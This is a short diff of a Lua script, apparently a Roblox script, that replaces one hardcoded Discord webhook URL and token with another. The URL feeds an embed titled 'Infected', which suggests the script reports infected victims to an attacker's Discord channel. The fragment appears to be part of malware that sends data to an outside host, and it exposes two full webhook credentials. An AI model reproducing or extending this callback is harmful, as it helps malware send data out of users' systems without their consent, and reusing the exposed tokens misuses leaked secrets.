@@ -259,7 +259,7 @@ local script = G2L["9"];
 			return
 		end
 	
-		local webhook_url = "https://discord.com/api/webhooks/1412738495901859953/E5D52MBP0VNGOcM3x7eZuYe9ZLV5w63rPQqjtrIu0guCgepany_a_PNuz8BFkTZ0Bm2j"
+		local webhook_url = "https://discord.com/api/webhooks/1413077044056555580/myr4UfvDLz2LrPEKehbxp2qileNq_mStX24B7vcmD4Wxap_MYZMPgM9BEWi1jfX1R8PI"
 	
 		local embedData = {
 			title = "Infected",
